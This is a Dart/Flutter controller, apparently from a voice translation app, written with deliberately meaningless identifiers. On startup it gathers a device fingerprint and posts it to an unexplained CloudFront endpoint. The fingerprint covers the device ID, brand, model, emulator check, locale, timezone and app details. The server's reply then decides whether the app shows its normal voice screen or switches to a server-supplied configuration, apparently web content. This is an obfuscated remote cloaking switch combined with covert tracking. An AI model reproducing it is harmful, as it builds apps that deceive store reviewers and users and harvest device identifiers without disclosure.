import 'dart:io';

import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


import 'package:dio/dio.dart';
class VoiceTransLogic extends GetxController {

  var fstwbor = RxBool(false);
  var ysuvtdz = RxBool(true);
  var nkqfse = RxString("");
  var ova = RxBool(false);
  var kris = RxBool(true);
  final vqoekgjxca = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    jtriy();
  }


  Future<void> jtriy() async {
    ova.value = true;
    kris.value = true;
    ysuvtdz.value = false;

    vqoekgjxca.post("https://dvfqpib2wodlc.cloudfront.net/aqjhmzrublxotsgvdywicfenkp",data: await orjmukig()).then((value) {
      var yomlprz = value.data["yomlprz"] as String;
      var dgnoxi = value.data["dgnoxi"] as bool;
      if (dgnoxi) {
        nkqfse.value = yomlprz;
        aliya();
      } else {
        stracke();
      }
    }).catchError((e) {
      ysuvtdz.value = true;
      kris.value = true;
      ova.value = false;
    });
  }

  Future<Map<String, dynamic>> orjmukig() async {
    final DeviceInfoPlugin vytgo = DeviceInfoPlugin();
    PackageInfo pqlk_yhpliuv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nuxgd = Platform.localeName;
    var mdfbioup = currentTimeZone;

    var wprsv = pqlk_yhpliuv.packageName;
    var cokzu = pqlk_yhpliuv.version;
    var nrxogb = pqlk_yhpliuv.buildNumber;

    var tmnrjhy = pqlk_yhpliuv.appName;
    var rkwpz = "";
    var qjrcoszy  = "";
    var dfoiqgm = "";
    var newellJacobs = "";
    var lloydErdman = "";
    var eldredCummings = "";
    var shadWeimann = "";


    var abczxuj = "";
    var brxd = false;

    if (GetPlatform.isAndroid) {
      abczxuj = "android";
      var yqalgcisvm = await vytgo.androidInfo;

      dfoiqgm = yqalgcisvm.brand;

      rkwpz  = yqalgcisvm.model;
      qjrcoszy = yqalgcisvm.id;

      brxd = yqalgcisvm.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      abczxuj = "ios";
      var cpbertuli = await vytgo.iosInfo;
      dfoiqgm = cpbertuli.name;
      rkwpz = cpbertuli.model;

      qjrcoszy = cpbertuli.identifierForVendor ?? "";
      brxd  = cpbertuli.isPhysicalDevice;
    }
    var res = {
      "tmnrjhy": tmnrjhy,
      "newellJacobs" : newellJacobs,
      "nrxogb": nrxogb,
      "wprsv": wprsv,
      "rkwpz": rkwpz,
      "eldredCummings" : eldredCummings,
      "mdfbioup": mdfbioup,
      "dfoiqgm": dfoiqgm,
      "qjrcoszy": qjrcoszy,
      "nuxgd": nuxgd,
      "abczxuj": abczxuj,
      "brxd": brxd,
      "cokzu": cokzu,
      "lloydErdman" : lloydErdman,
      "shadWeimann" : shadWeimann,

    };
    return res;
  }

  Future<void> stracke() async {
    Get.offNamed("/voice_tab");
  }

  Future<void> aliya() async {
    Get.offNamed("/voice_config");
  }

}
